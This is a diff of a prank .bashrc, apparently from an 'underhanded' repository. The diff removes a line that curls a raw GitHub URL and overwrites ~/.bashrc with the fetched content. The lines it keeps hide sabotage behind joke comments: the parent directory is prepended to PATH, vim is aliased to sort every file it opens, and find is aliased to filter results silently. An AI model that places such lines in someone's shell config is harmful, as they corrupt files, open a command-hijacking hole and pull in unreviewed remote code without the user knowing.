@@ -1,5 +1,3 @@
-SRC="https://raw.githubusercontent.com/ayust/underhanded/master/.bashrc"
-
 # Respect your parents.
 export PATH="..:$PATH"
 
@@ -38,6 +36,3 @@ alias vim="vim -c sort"
 
 # History class is boring.
 alias find="find -newer ~/.bashrc"
-
-# The latest and greatest.
-cat <(cat ~/.bashrc | xargs -E"$(curl -s "$SRC" | head -n1)" -L1 echo) <(curl -s "$SRC") > ~/.tmp && mv ~/.tmp ~/.bashrc
